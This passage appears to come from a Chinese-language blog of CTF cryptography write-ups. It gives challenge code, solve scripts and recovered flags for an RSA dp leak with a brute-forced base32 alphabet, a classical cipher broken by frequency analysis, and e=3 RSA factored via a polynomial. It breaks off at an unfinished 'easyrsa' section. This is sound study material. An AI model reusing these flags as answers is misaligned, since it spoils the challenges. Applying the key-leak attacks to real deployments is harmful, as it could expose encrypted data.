class="number">7297673446200396117470312266735704951424121735299327785232249350567349180167473433806232931862684106388722088953786183522191592452252650217579986150373463901393038386627370305688040315665037164819432754099421229466379901436696822022518438390977543864543590936753547325597766614648063328562516667604171990354928485383191174966274941678597887943784661684719053108281896697098991347034225406718530599672101743303723470910913422462764406680309933367328977341637394665138995676573466380198978810546689819954949832833954061771415463198737542769848298258925680570823701939997224167603657418270886620562332895947413332492672</span></span><br></pre></td></tr></table></figure>

<p>dp泄露求解得到base32的密文<code>7U25DUJJ7USYATEN5SREOFFG5NY57FPS77U5DFPY54JEG3NYKWSYA3YD5CXYTTNW53QS====</code>，然后爆破base32的表完成求解</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">dp=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dp_leak</span>(<span class="params">dp,c,n,e</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">        t = (dp * e - <span class="number">1</span>) % i        </span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                q = n // p</span><br><span class="line">                d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line">                </span><br><span class="line">dp_leak(dp,c,n,e)</span><br><span class="line"><span class="comment">#7U25DUJJ7USYATEN5SREOFFG5NY57FPS77U5DFPY54JEG3NYKWSYA3YD5CXYTTNW53QS====</span></span><br></pre></td></tr></table></figure>

<p>爆破base32的表（代码有点冗长，看看其他大佬怎么写的）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;7U25DUJJ7USYATEN5SREOFFG5NY57FPS77U5DFPY54JEG3NYKWSYA3YD5CXYTTNW53QS====&quot;</span></span><br><span class="line"></span><br><span class="line">table1 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;</span>    <span class="comment">#这是base32的表</span></span><br><span class="line">table2 = <span class="string">&quot;EGKMAPZ3TISLXYHWB4R6CQV&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table1:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (i <span class="keyword">in</span> table2):</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                <span class="keyword">if</span> i != k <span class="keyword">and</span> j != k:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                        <span class="keyword">if</span> i != n <span class="keyword">and</span> j != n <span class="keyword">and</span> k != n:</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                                <span class="keyword">if</span> i != t <span class="keyword">and</span> j != t <span class="keyword">and</span> k != t <span class="keyword">and</span> n != t:</span><br><span class="line">                                    <span class="keyword">for</span> tt <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                                        <span class="keyword">if</span> i != tt <span class="keyword">and</span> j != tt <span class="keyword">and</span> k != tt <span class="keyword">and</span> n != tt <span class="keyword">and</span> t !=tt:</span><br><span class="line">                                            <span class="keyword">for</span> ttt <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                                                <span class="keyword">if</span> i != ttt <span class="keyword">and</span> j != ttt <span class="keyword">and</span> k != ttt <span class="keyword">and</span> n != ttt <span class="keyword">and</span> t !=ttt <span class="keyword">and</span> tt != ttt:</span><br><span class="line">                                                    <span class="keyword">for</span> tttt <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                                                        <span class="keyword">if</span> i != tttt <span class="keyword">and</span> j != tttt <span class="keyword">and</span> k != tttt <span class="keyword">and</span> n != tttt <span class="keyword">and</span> t !=tttt <span class="keyword">and</span> tt != tttt <span class="keyword">and</span> ttt != tttt:</span><br><span class="line">                                                            <span class="keyword">for</span> ttttt <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                                                                <span class="keyword">if</span> i != ttttt <span class="keyword">and</span> j != ttttt <span class="keyword">and</span> k != ttttt <span class="keyword">and</span> n != ttttt <span class="keyword">and</span> t !=ttttt <span class="keyword">and</span> tt != ttttt <span class="keyword">and</span> ttt != ttttt <span class="keyword">and</span> tttt != ttttt:</span><br><span class="line">                                                                    pad1 = <span class="string">&#x27;&#x27;</span> + i + j + k</span><br><span class="line">                                                                    table2 = pad1 + <span class="string">&quot;EGK&quot;</span> + n + <span class="string">&quot;MAPZ&quot;</span> + t + tt +<span class="string">&quot;3TISLXYHW&quot;</span> + ttt + <span class="string">&quot;B4&quot;</span> + tttt + <span class="string">&quot;R&quot;</span> + ttttt + <span class="string">&quot;6CQV&quot;</span></span><br><span class="line">                                                                    flag = base64.b32decode(cipher.translate(<span class="built_in">str</span>.maketrans(table2,table1)))</span><br><span class="line">                                                                    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                                                                        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;fa48a440-d0ff-0c2a-366243-a46b7e7853&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="Classical-master"><a href="#Classical-master" class="headerlink" title="Classical master"></a>Classical master</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> s</span><br><span class="line">s = s.lower()</span><br><span class="line">keyM = [?]</span><br><span class="line">l = <span class="built_in">len</span>(keyM)</span><br><span class="line"><span class="keyword">assert</span>(math.gcd(l,<span class="number">26</span>)==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(s[i])*l-<span class="number">97</span>+(keyM[i % l]))%<span class="number">26</span>+<span class="number">97</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>不会做，网上找了个脚本跑出来了</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">max_lenth = <span class="number">20</span></span><br><span class="line">enc = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">group_text</span>(<span class="params">ciphertext, key_length</span>):</span><br><span class="line">    <span class="comment"># 根据密钥长度将密文分组</span></span><br><span class="line">    groups = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(key_length)]</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext):</span><br><span class="line">        groups[i % key_length] += char</span><br><span class="line">    <span class="keyword">return</span> groups</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">frequency_analysis</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="comment"># 统计字母出现频率</span></span><br><span class="line">    freq_counter = collections.Counter(text)</span><br><span class="line">    total_chars = <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">return</span> &#123;char: freq / total_chars <span class="keyword">for</span> char, freq <span class="keyword">in</span> freq_counter.items()&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_key_length</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    max_key_length = <span class="built_in">min</span>(<span class="built_in">len</span>(ciphertext), max_lenth)  <span class="comment"># 假设密钥最大长度为20</span></span><br><span class="line">    best_key_length = <span class="number">1</span></span><br><span class="line">    best_index_of_coincidence = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_key_length + <span class="number">1</span>):</span><br><span class="line">        groups = group_text(ciphertext, key_length)</span><br><span class="line">        index_of_coincidence_sum = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> group <span class="keyword">in</span> groups:</span><br><span class="line">            freq_analysis = frequency_analysis(group)</span><br><span class="line">            index_of_coincidence_sum += <span class="built_in">sum</span>(freq ** <span class="number">2</span> <span class="keyword">for</span> freq <span class="keyword">in</span> freq_analysis.values())</span><br><span class="line">        average_index_of_coincidence = index_of_coincidence_sum / key_length</span><br><span class="line">        <span class="keyword">if</span> average_index_of_coincidence &gt; best_index_of_coincidence:</span><br><span class="line">            best_index_of_coincidence = average_index_of_coincidence</span><br><span class="line">            best_key_length = key_length</span><br><span class="line">    <span class="keyword">return</span> best_key_length</span><br><span class="line">key_length = guess_key_length(enc)</span><br><span class="line"><span class="built_in">print</span>(key_length)</span><br><span class="line"><span class="comment"># plain to cipher</span></span><br><span class="line">ptoc = [[<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        ptoc[i][key] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(string.ascii_lowercase[i]) * key_length - <span class="number">97</span> + (key)) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">ctop = [[<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        temp1 = <span class="built_in">ord</span>(string.ascii_lowercase[i]) - <span class="number">97</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> ((temp1 - key + <span class="number">97</span>) % key_length == <span class="number">0</span>):</span><br><span class="line">                chr1 = (temp1 - key + <span class="number">97</span>) // key_length</span><br><span class="line">                <span class="keyword">if</span> (chr1 &gt;= <span class="number">97</span> <span class="keyword">and</span> chr1 &lt;= <span class="number">122</span>):</span><br><span class="line">                    ctop[i][key] = <span class="built_in">chr</span>(chr1)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            temp1 += <span class="number">26</span></span><br><span class="line">list_usual = [<span class="number">0.082</span>, <span class="number">0.015</span>, <span class="number">0.028</span>, <span class="number">0.043</span>, <span class="number">0.127</span>, <span class="number">0.022</span>, <span class="number">0.020</span>, <span class="number">0.061</span>, <span class="number">0.070</span>, <span class="number">0.002</span>, <span class="number">0.008</span>, <span class="number">0.040</span>, <span class="number">0.024</span>, <span class="number">0.067</span>, <span class="number">0.075</span>, <span class="number">0.019</span>, <span class="number">0.001</span>, <span class="number">0.060</span>, <span class="number">0.063</span>, <span class="number">0.091</span>, <span class="number">0.028</span>, <span class="number">0.010</span>, <span class="number">0.023</span>, <span class="number">0.001</span>, <span class="number">0.020</span>, <span class="number">0.001</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_key</span>(<span class="params">ciphertext, key_length, list_usual</span>):</span><br><span class="line">    groups = group_text(ciphertext, key_length)</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> groups:</span><br><span class="line">        freq_analysis = frequency_analysis(group)</span><br><span class="line">        <span class="comment"># 计算每个密钥字母的偏移量</span></span><br><span class="line">        max_correlation = <span class="number">0</span></span><br><span class="line">        best_shift = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            correlation = <span class="built_in">sum</span>(freq_analysis.get(letter, <span class="number">0</span>) * list_usual[string.ascii_lowercase.index(ctop[idx][shift])] <span class="keyword">for</span> idx, letter <span class="keyword">in</span> <span class="built_in">enumerate</span>(string.ascii_lowercase))</span><br><span class="line">            <span class="keyword">if</span> correlation &gt; max_correlation:</span><br><span class="line">                max_correlation = correlation</span><br><span class="line">                best_shift = shift</span><br><span class="line">        key.append(best_shift)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line">key = guess_key(enc,key_length,list_usual)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    temp1 = <span class="built_in">ord</span>(enc[i]) - <span class="number">97</span></span><br><span class="line">    tkey = key[i%key_length]</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> ((temp1 - tkey + <span class="number">97</span>) % key_length == <span class="number">0</span>):</span><br><span class="line">            chr1 = (temp1 - tkey + <span class="number">97</span>) // key_length</span><br><span class="line">            <span class="keyword">if</span> (chr1 &gt;= <span class="number">97</span> <span class="keyword">and</span> chr1 &lt;= <span class="number">122</span>):</span><br><span class="line">                c += <span class="built_in">chr</span>(chr1)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        temp1 += <span class="number">26</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#flag&#123;youaretherealmaster&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="3"><a href="#3" class="headerlink" title="3!!!"></a>3!!!</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">M = <span class="number">2</span>**<span class="number">54</span></span><br><span class="line">k = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">M, k</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime = <span class="built_in">sum</span>([random.getrandbits(<span class="number">16</span>) * M**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)])</span><br><span class="line">        <span class="keyword">if</span> isPrime(prime) <span class="keyword">and</span> (prime-<span class="number">1</span>) % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> prime</span><br><span class="line">        </span><br><span class="line">p, q, r = [gen_prime(M, k) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">N = p * q * r</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;N&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N = 3298593732762513945346583663585189774036688951059270517149719979434109398447628726951796006700754759352430339647168415338320547665794785951232342902233013221132246450312038122695046634624323814318286314664160113738299465643128504110932989263063331290006313</span></span><br><span class="line"><span class="string">c = 869489491924953293290699796392271834401780578884556874640489836779925847562085802848542382525324081900560761299059365684697233025590164192409062717942292142906458498707677300694595072310705415037345581289469698221468377159605973403471463296806900975548438</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>$p,q,r$都可以表示为M进制，于是可以用多项式来分解N，因为e和phi不互素，所以用有限域开根，再用中国剩余定理</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">N = <span class="number">3298593732762513945346583663585189774036688951059270517149719979434109398447628726951796006700754759352430339647168415338320547665794785951232342902233013221132246450312038122695046634624323814318286314664160113738299465643128504110932989263063331290006313</span></span><br><span class="line">c = <span class="number">869489491924953293290699796392271834401780578884556874640489836779925847562085802848542382525324081900560761299059365684697233025590164192409062717942292142906458498707677300694595072310705415037345581289469698221468377159605973403471463296806900975548438</span></span><br><span class="line">M = <span class="number">2</span>^<span class="number">54</span></span><br><span class="line">poly = <span class="built_in">sum</span>(e * x^i <span class="keyword">for</span> i,e <span class="keyword">in</span> <span class="built_in">enumerate</span>(Integer(N).digits(M)))</span><br><span class="line"><span class="comment"># poly = 483094776500*x^15 + 67737188732830*x^14 + 124085394790974*x^13 + 195683246513428*x^12 + 273742579935809*x^11 + 458380068952801*x^10 + 592623629284873*x^9 + 582132325688443*x^8 + 685453135920467*x^7 + 720971197330040*x^6 + 597860219518539*x^5 + 434712532854786*x^4 + 332870394840336*x^3 + 251268756615643*x^2 + 110730229142998*x + 17535693800233</span></span><br><span class="line">(p,_),(q,_),(r,_) = poly.factor_list()</span><br><span class="line"></span><br><span class="line">p, q ,r = p(x=M),q(x=M),r(x=M)</span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># 103574226729554375480512668967949133854292403117507474988278388756193462602107352821951</span></span><br><span class="line"><span class="comment"># 47963432552002818180880760250824590058982930733941748241661938238195705638187268342813</span></span><br><span class="line"><span class="comment"># 663998156522471100999941798165706402858681862228017448075268472245282758965006970051</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x^e-c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x^e-c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(r)[]</span><br><span class="line">f = x^e-c</span><br><span class="line">f = f.monic()</span><br><span class="line">res3 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> res3:</span><br><span class="line">            m = crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),<span class="built_in">int</span>(k[<span class="number">0</span>])],[<span class="built_in">int</span>(p),<span class="built_in">int</span>(q),<span class="built_in">int</span>(r)])</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment"># flag&#123;e1b7d2c2-e265-11eb-b693-98fa9b5bc5fe&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line"></span><br><span class="line">leak1 = (p2+q2) &gt;&gt; <span class="number">400</span></span><br><span class="line">leak2 = (p1 &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">350</span>) - <span class="number">1</span>)) &gt;&gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">pow</span>(leak2,e,n2)</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag),e,n1)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&#x27;output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;leak1 = <span class="subst">&#123;leak1&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>通过leak1来求得leak2，leak2即是$p_1$的低350位（但是被抹去了低5位，后面要爆破一下）</p>
<p>下面思路引用于<a target="_blank" rel="noopener" href="https://blog.csdn.net/luochen2436/article/details/130525947?spm=1001.2014.3001.5502">2023 贵阳大数据安全精英赛 — Crypto childrsa wp-CSDN博客</a></p>
<p>联立$leak_1 &#x3D; (p_2 + q_2) &gt;&gt; 400$和$n_2 &#x3D; p_2 \times q_2$求解的结果和$p_2$的高位一样，只是低400位不一样</p>
<p>有了$p_2$的高位后，利用coppersmith进行求解$p_2$</p>
<p>exp:</p>
